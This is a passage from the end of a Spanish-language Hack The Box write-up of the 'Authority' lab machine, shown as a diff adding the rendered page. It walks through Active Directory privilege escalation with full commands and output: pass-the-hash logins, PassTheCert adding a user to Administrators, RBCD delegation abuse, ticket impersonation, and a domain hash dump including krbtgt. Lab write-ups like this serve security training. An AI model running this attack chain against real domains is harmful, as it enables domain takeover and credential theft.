+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'administrator.ccache'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator@authority.htb'</span>: aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed
+</code></pre></div></div>
+
+<ul>
+  <li>Son credenciales validas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme winrm 10.10.11.222 <span class="nt">-u</span> administrator <span class="nt">-H</span> <span class="s1">'6961f422924da90a6928197429eea4ed'</span>
+SMB         10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
+HTTP        10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.222:5985/wsman
+WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\a</span>dministrator:6961f422924da90a6928197429eea4ed <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Nos podemos conectar.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.10.11.222 <span class="nt">-u</span> administrator <span class="nt">-H</span> <span class="s1">'6961f422924da90a6928197429eea4ed'</span>
+                                   
+Evil-WinRM shell v3.5
+                                   
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                   
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                   
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>htb<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+6f14e5def2f1681729325fa02fcbefb5
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>En caso de que no pudieras solicitar el hash puedes emplear este ataque <a href="https://github.com/AlmondOffSec/PassTheCert">https://github.com/AlmondOffSec/PassTheCert</a>.</p>
+  </li>
+  <li>
+    <p>Para esto necesitamos la <code class="language-plaintext highlighter-rouge">key</code> y un certificado.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ certipy cert <span class="nt">-pfx</span> administrator_authority.pfx <span class="nt">-nocert</span> <span class="nt">-out</span> administrator.key
+Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing private key to <span class="s1">'administrator.key'</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ certipy cert <span class="nt">-pfx</span> administrator_authority.pfx <span class="nt">-nokey</span> <span class="nt">-out</span> administrator.crt
+Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing certificate and  to <span class="s1">'administrator.crt'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Ahora usamos la herramienta.</p>
+  </li>
+  <li>
+    <p>Lo que estamos haciendo es añadiendo al usuario svc_ldap al grupo Administrators.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 /opt/PassTheCert/Python/passthecert.py <span class="nt">-action</span> ldap-shell <span class="nt">-crt</span> administrator.crt <span class="nt">-key</span> administrator.key <span class="nt">-domain</span> authority.htb <span class="nt">-dc-ip</span> 10.10.11.222
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Type <span class="nb">help </span><span class="k">for </span>list of commands
+
+<span class="c"># help</span>
+
+ add_computer computer <span class="o">[</span>password] <span class="o">[</span>nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
+ rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
+ add_user new_user <span class="o">[</span>parent] - Creates a new user.
+ add_user_to_group user group - Adds a user to a group.
+ change_password user <span class="o">[</span>password] - Attempt to change a given user<span class="s1">'s password. Requires LDAPS.
+ clear_rbcd target - Clear the resource based constrained delegation configuration information.
+ disable_account user - Disable the user'</span>s account.
+ enable_account user - Enable the user<span class="s1">'s account.
+ dump - Dumps the domain.
+ search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
+ get_user_groups user - Retrieves all groups this user is a member of.
+ get_group_users group - Retrieves all members of a group.
+ get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
+ grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
+ set_dontreqpreauth user true/false - Set the don'</span>t require pre-authentication flag to <span class="nb">true </span>or false.
+ set_rbcd target grantee - Grant the grantee <span class="o">(</span>sAMAccountName<span class="o">)</span> the ability to perform RBCD to the target <span class="o">(</span>sAMAccountName<span class="o">)</span><span class="nb">.</span>
+ start_tls - Send a StartTLS <span class="nb">command </span>to upgrade from LDAP to LDAPS. Use this to bypass channel binding <span class="k">for </span>operations necessitating an encrypted channel.
+ write_gpo_dacl user gpoSID - Write a full control ACE to the gpo <span class="k">for </span>the given user. The gpoSID must be entered surrounding by <span class="o">{}</span><span class="nb">.</span>
+ <span class="nb">exit</span> - Terminates this session.
+
+<span class="c"># add_user_to_group svc_ldap administrators</span>
+Adding user: svc_ldap to group Administrators result: OK
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora podemos dumpear los hashes como el del administrador para conectarnos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">--sam</span>
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] Dumping SAM hashes
+SMB         10.10.11.222    445    AUTHORITY        Administrator:500:aad3b435b51404eeaad3b435b51404ee:a15217bb5af3046c87b5bb6afa7b193e:::
+SMB         10.10.11.222    445    AUTHORITY        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.11.222    445    AUTHORITY        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ERROR:root:SAM hashes extraction <span class="k">for </span>user WDAGUtilityAccount failed. The account doesn<span class="s1">'t have hash information.
+SMB         10.10.11.222    445    AUTHORITY        [+] Added 3 SAM hashes to the database
+</span></code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Por alguna razón el hash que nos da <code class="language-plaintext highlighter-rouge">crackmapexec</code> no es correcto pero podemos solicitarlo de otra forma.</p>
+  </li>
+  <li>
+    <p>Vamos a usar write_rbcd para darle permisos de <code class="language-plaintext highlighter-rouge">delegration</code> sobre el DC.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 /opt/PassTheCert/Python/passthecert.py <span class="nt">-action</span> write_rbcd <span class="nt">-delegate-to</span> <span class="s1">'AUTHORITY$'</span> <span class="nt">-delegate-from</span> <span class="s1">'miguel$'</span> <span class="nt">-crt</span> administrator.crt <span class="nt">-key</span> administrator.key <span class="nt">-domain</span> authority.htb <span class="nt">-dc-ip</span> 10.10.11.222
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Delegation rights modified successfully!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> miguel<span class="nv">$ </span>can now impersonate <span class="nb">users </span>on AUTHORITY<span class="nv">$ </span>via S4U2Proxy
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Accounts allowed to act on behalf of other identity:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span>     miguel<span class="nv">$ </span>     <span class="o">(</span>S-1-5-21-622327497-3269355298-2248959698-11602<span class="o">)</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Se refiere a la capacidad de un usuario, grupo o computadora para delegar su autoridad o permisos a otro usuario, grupo o computadora. Esto es especialmente relevante en entornos de red y dominio donde es común delegar ciertos permisos administrativos a usuarios o equipos específicos para realizar tareas específicas sin otorgar acceso completo.</p>
+</blockquote>
+
+<ul>
+  <li>Ahora obtenemos el ticket.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-getST <span class="nt">-spn</span> <span class="s1">'cifs/AUTHORITY.AUTHORITY.HTB'</span> <span class="nt">-impersonate</span> Administrator <span class="s1">'authority.htb/miguel$:miguel123'</span>
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span>-] CCache file is not found. Skipping...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2self
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2Proxy
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator@cifs_AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB.ccache
+</code></pre></div></div>
+
+<ul>
+  <li>Y ahora si obtenemos los hashes.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@cifs_AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB.ccache impacket-secretsdump <span class="nt">-k</span> <span class="nt">-no-pass</span> authority.htb/administrator@authority.authority.htb <span class="nt">-just-dc-ntlm</span>
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
+svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
+AUTHORITY<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:42e6e4d7486c17cbc44fd23c758d39d1:::
+miguel<span class="nv">$:</span>11602:aad3b435b51404eeaad3b435b51404ee:0ddc9e8df3c8843f75a918df65dda6ee:::
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora si ya nos pudimos conectar.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> authority.htb <span class="nt">-u</span> administrator <span class="nt">-H</span> 6961f422924da90a6928197429eea4ed
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>htb<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/medium/2024/07/10/authority.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
